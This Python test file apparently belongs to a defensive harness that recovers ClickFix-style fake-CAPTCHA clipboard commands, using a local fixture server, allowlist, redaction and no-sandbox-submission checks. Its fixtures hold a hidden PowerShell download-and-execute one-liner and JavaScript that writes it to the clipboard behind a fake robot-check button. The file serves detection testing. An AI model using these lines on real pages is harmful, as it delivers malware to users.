"""Tests for the staged dry-run harness: allowlist, evidence, validation,
timeouts/failures, and the no-CAPE-submission invariant. Static-path tests run
under system python; the browser-path test skips without Playwright."""
import json
import os
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import dryrun_harness as H  # noqa: E402

PS = 'powershell -w hidden -nop -c "iex(irm http://example.invalid/a.ps1)"'
# Placeholder template: looks command-like (passes extraction) but is an
# unresolved server-side template (fails validation).
PLACEHOLDER = 'powershell -nop -c "iex(irm REPLACE_SERVER/a.ps1)"'
FIX = {
    # literal command in source -> static recovers + validates
    "/static_cmd": ("text/html", '<script>navigator.clipboard.writeText(%r)</script>' % PS),
    # no command at all
    "/benign": ("text/html", "<h1>Verify you are human</h1>"),
    # command-shaped but unresolved placeholder -> extraction yes, validation no
    "/placeholder": ("text/html", '<script>navigator.clipboard.writeText(%r)</script>' % PLACEHOLDER),
    # command ONLY in a fetched secondary response -> static CANNOT (FN), browser CAN
    "/secondary": ("text/html",
        '<button class="im-not-a-robot">x</button><script>'
        'document.querySelector(".im-not-a-robot").addEventListener("click",'
        'function(){fetch("/cmd").then(r=>r.text()).then(t=>navigator.clipboard.writeText(t))})</script>'),
    "/cmd": ("text/plain", PS),
}


class _S(BaseHTTPRequestHandler):
    def do_GET(self):
        r = FIX.get(self.path.split("?")[0])
        if r is None:
            self.send_error(404); return
        ct, body = r; data = body.encode()
        self.send_response(200); self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(data))); self.end_headers(); self.wfile.write(data)
    def log_message(self, *a): pass


class HarnessBase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = HTTPServer(("127.0.0.1", 0), _S)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.port = cls.srv.server_port
        cls.base = "http://127.0.0.1:%d" % cls.port
    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()


class TestAllowlist(HarnessBase):
    def test_nonallowlisted_host_refused_no_navigation(self):
        calls = {"n": 0}
        orig = H.extract_command
        def boom(*a, **k):
            calls["n"] += 1
            raise AssertionError("must not navigate a non-allowlisted host")
        H.extract_command = boom
        try:
            r = H.run_case("https://richmondparkhomes.ca/")  # live site -> refused
        finally:
            H.extract_command = orig
        self.assertFalse(r.host_allowed)
        self.assertEqual(r.static["failure_reason"], "host_not_allowlisted")
        self.assertEqual(calls["n"], 0)  # extractor never invoked

    def test_allowlisted_localhost_runs(self):
        r = H.run_case(self.base + "/static_cmd")
        self.assertTrue(r.host_allowed)
        self.assertTrue(r.static["recovered"])

    def test_explicit_allowlist_can_opt_in_host(self):
        # host_allowed honors an explicitly supplied allowlist
        self.assertTrue(H.host_allowed("https://example.com/x", {"example.com"}))
        self.assertFalse(H.host_allowed("https://evil.com/x", {"example.com"}))


class TestEvidence(HarnessBase):
    def test_evidence_persisted_with_required_keys(self):
        with tempfile.TemporaryDirectory() as d:
            H.run_case(self.base + "/static_cmd", out_dir=d)
            files = [f for f in os.listdir(d) if f.endswith(".json")]
            self.assertEqual(len(files), 1)
            ev = json.load(open(os.path.join(d, files[0])))
            for k in ("source_url", "timestamp", "host_allowed", "cape_submitted", "static"):
                self.assertIn(k, ev)
            self.assertFalse(ev["cape_submitted"])
            self.assertEqual(len(ev["static"]["command_sha256"]), 64)
            self.assertIn("hxxp", ev["static"]["command_redacted_preview"])  # defanged

    def test_secret_redaction_and_size_cap(self):
        self.assertIn("<redacted", H.redact("curl -H 'Authorization: Bearer abcdef12345'"))
        self.assertIn("<redacted-userinfo>", H.redact("http://user:pass@h/x"))
        capped, trunc = H._cap("A" * (H.MAX_ARTIFACT_CHARS + 50))
        self.assertTrue(trunc)
        self.assertEqual(len(capped), H.MAX_ARTIFACT_CHARS)


class TestValidation(HarnessBase):
    def test_placeholder_recovered_but_invalid(self):
        r = H.run_case(self.base + "/placeholder")
        self.assertTrue(r.static["recovered"])                 # command-shaped, extracted
        self.assertFalse(r.static["is_valid_command"])         # unresolved template -> invalid
        self.assertEqual(r.static["validation_status"], "invalid")

    def test_benign_page_no_recovery(self):
        r = H.run_case(self.base + "/benign")
        self.assertFalse(r.static["recovered"])


class TestFailures(HarnessBase):
    def test_unreachable_is_graceful(self):
        # allowlisted host, dead port -> static failure, no crash
        r = H.run_case("http://127.0.0.1:1/x")
        self.assertTrue(r.host_allowed)
        self.assertFalse(r.static.get("recovered"))
        self.assertIsNotNone(r.static.get("failure_reason"))


class TestNoCapeSubmission(HarnessBase):
    def test_result_invariant_and_no_cape_code(self):
        r = H.run_case(self.base + "/static_cmd")
        self.assertFalse(r.cape_submitted)
        self.assertFalse(H.SUBMIT_TO_CAPE)
        src = open(H.__file__).read()
        for forbidden in ("submit_ps1", "submit_payload", "tasks/create", "cape_client", "CapeClient"):
            self.assertNotIn(forbidden, src)

    def test_suite_comparison_static_only(self):
        cases = [
            {"url": self.base + "/static_cmd", "expected": "command"},
            {"url": self.base + "/benign", "expected": "none"},
            {"url": self.base + "/placeholder", "expected": "none"},
            {"url": self.base + "/secondary", "expected": "command"},  # static FN (command only in fetch)
        ]
        rep = H.run_suite(cases, use_browser=False)
        s = rep["summary"]["static"]
        self.assertEqual(s["recovered_valid"], 1)   # only /static_cmd
        self.assertEqual(s["fp"], 0)                 # /placeholder invalid -> no FP
        self.assertEqual(s["fn"], 1)                 # /secondary unrecoverable statically


@unittest.skipUnless(H.HAVE_PLAYWRIGHT, "playwright not available (run under venv)")
class TestBrowserPath(HarnessBase):
    def test_browser_recovers_click_only_and_timeout(self):
        # browser recovers the click-gated command static missed
        r = H.run_case(self.base + "/secondary", use_browser=True)
        self.assertTrue(r.browser["recovered"])
        self.assertTrue(r.browser["is_valid_command"])
        self.assertTrue(r.browser["via_interaction"])
        # suite: browser fixes the static FN (command only in fetched body)
        cases = [
            {"url": self.base + "/static_cmd", "expected": "command"},
            {"url": self.base + "/secondary", "expected": "command"},
            {"url": self.base + "/benign", "expected": "none"},
        ]
        rep = H.run_suite(cases, use_browser=True)
        self.assertEqual(rep["summary"]["browser"]["recovered_valid"], 2)
        self.assertEqual(rep["summary"]["browser"]["fn"], 0)

    def test_browser_timeout_no_write(self):
        r = H.run_case(self.base + "/benign", use_browser=True,
                       browser_kw={"final_settle_ms": 600})
        self.assertFalse(r.browser["recovered"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
